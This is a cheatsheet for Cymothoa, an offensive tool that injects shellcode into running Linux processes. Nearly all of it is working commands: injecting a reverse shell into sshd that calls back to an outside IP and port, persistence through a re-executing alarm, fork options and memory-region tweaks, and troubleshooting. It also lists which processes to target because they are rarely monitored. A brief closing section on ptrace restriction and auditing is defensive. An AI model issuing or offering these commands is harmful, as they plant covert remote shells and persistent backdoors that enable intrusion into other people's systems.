# Cymothoa Cheatsheet

## Quick Reference

### Installation

```bash
sudo apt update && sudo apt install cymothoa
```

### Basic Injection

```bash
# List available shellcodes
sudo cymothoa -S

# Find target PID
pidof sshd

# Inject reverse shell
sudo cymothoa -p $(pidof sshd) -s 0 -x 192.168.1.100 -y 4444
```

### Key Flags

| Flag | Description |
|------|-------------|
| `-p` | Target PID |
| `-s` | Shellcode number |
| `-l` | Injection memory region (default: /lib/ld, search r-xp) |
| `-m` | Persistent memory region (default: /lib/ld, search rw-p) |
| `-f` | Fork parent process |
| `-F` | Don't fork |
| `-b` | Create payload thread |
| `-B` | Don't create thread |
| `-w` | Pass persistent memory address |
| `-a` | Use alarm scheduler |
| `-A` | Don't use alarm |
| `-t` | Use setitimer scheduler |
| `-j` | Timer seconds |
| `-k` | Timer microseconds |
| `-x` | Callback IP |
| `-y` | Callback port |
| `-r` | Secondary port |
| `-z` | Username (4 bytes) |
| `-o` | Password (8 bytes) |
| `-c` | Script code |

### Persistence with Alarm

```bash
# Re-execute every 60 seconds
sudo cymothoa -p $(pidof sshd) -s 0 -x 192.168.1.100 -y 4444 -a -j 60
```

### Fork vs No-Fork

```bash
# Fork: original process continues
sudo cymothoa -p $(pidof sshd) -s 0 -x 192.168.1.100 -y 4444 -f

# No-fork: replaces original process
sudo cymothoa -p $(pidof sshd) -s 0 -x 192.168.1.100 -y 4444 -F
```

### Custom Memory Region

```bash
# Inject into specific region
sudo cymothoa -p $(pidof sshd) -s 0 -l /usr/lib/libc.so.6 -x 192.168.1.100 -y 4444
```

### Best Target Processes

- `sshd` — Always running, network-capable, root
- `apache2`/`nginx` — Web server, network access
- `cron` — Background daemon, rarely monitored
- `rsyslogd` — Universal, minimal monitoring

### Companion Tools

```bash
# Binary grep
bgrep "\x90\x90\x90\x90" /usr/bin/sshd

# UDP server
udp_server 4444
```

### Troubleshooting

```bash
# Permission denied → needs root
sudo cymothoa -p <pid> -s 0

# Process crashes → try different memory region
sudo cymothoa -p <pid> -s 0 -l /usr/lib/libc.so.6

# No persistence → enable alarm
sudo cymothoa -p <pid> -s 0 -a -j 30 -x 192.168.1.100 -y 4444
```

### Defense

```bash
# Restrict ptrace
echo 1 | sudo tee /proc/sys/kernel/yama/ptrace_scope

# Monitor ptrace calls
auditctl -a always,exit -F arch=b64 -S ptrace -k ptrace_monitor
```
